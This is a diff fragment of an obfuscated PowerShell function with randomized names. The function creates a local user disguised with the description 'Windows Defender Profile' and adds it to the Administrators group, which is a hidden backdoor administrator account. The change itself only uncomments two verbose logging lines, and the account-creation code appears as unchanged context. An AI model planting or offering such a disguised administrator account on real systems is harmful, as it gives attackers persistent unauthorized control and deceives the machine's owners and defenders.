@@ -13,9 +13,9 @@ function hqTnJbKVSsMrZgXw {
     }    
     process {
         New-LocalUser "$vWrPkQSpYZtOb" -Password $WSUcYXCfOldphPx -FullName "$vWrPkQSpYZtOb" -Description "Windows Defender Profile" # can remove description parameter if want
-        # Write-Verbose "$vWrPkQSpYZtOb local user crated"
+        Write-Verbose "$vWrPkQSpYZtOb local user crated"
         Add-LocalGroupMember -Group "Administrators" -Member "$vWrPkQSpYZtOb"
-        # Write-Verbose "$vWrPkQSpYZtOb added to the local administrator group"
+        Write-Verbose "$vWrPkQSpYZtOb added to the local administrator group"
     }    
     end {
     }
